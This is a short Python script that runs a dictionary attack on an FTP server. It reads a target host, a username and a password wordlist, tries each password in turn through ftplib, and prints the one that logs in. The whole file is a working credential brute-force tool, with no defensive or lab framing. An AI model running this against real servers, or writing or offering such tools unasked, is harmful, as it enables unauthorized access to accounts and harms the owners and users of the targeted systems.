import ftplib

server = input("FTP Server: ")
user = input("username: ")
Passwordlist = input("Path to Password List > ")

try:
    with open(Passwordlist, 'r') as pw:
        for word in pw:
            word = word.strip('\r\n')
            try:
                ftp = ftplib.FTP(server)
                ftp.login(user, word)
                print('Success! The Password is: ' + word)
                ftp.quit()  # Always quit after a successful login
                break  # Exit the loop if login is successful
            except ftplib.error_perm as exc:
                print('Still trying...', exc)
            except Exception as exc:
                print('Error:', exc)
except FileNotFoundError:
    print("Password list file not found.")
except Exception as e:
    print("An error occurred: ", e)
